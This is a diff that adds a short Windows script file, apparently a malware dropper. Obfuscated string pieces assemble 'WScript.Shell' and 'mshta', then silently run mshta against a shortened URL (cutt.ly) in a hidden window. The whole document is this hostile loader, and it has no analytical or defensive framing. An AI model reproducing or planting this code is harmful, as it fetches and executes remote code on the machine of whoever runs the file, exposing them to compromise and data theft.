@@ -1,0 +1,6 @@
+cfhljqpo = ("ipt.Shel")
+var yfaurchl = WScript.CreateObject("WScr"+cfhljqpo+"l")
+qzdzzndl = ("m")
+emoxwsci = ("sh")
+oedmcbnk = ("ta ")
+yfaurchl.Run((qzdzzndl+emoxwsci+oedmcbnk)+" https://cutt.ly/vnOtMrF",0)
